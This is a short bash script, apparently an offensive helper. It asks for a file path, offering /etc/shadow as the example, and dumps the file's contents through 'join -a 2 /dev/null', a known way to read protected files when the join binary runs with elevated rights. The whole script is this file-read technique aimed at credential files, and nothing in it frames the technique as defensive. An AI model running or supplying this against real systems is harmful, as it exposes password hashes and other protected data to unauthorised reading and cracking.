#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
join -a 2 /dev/null $filepath
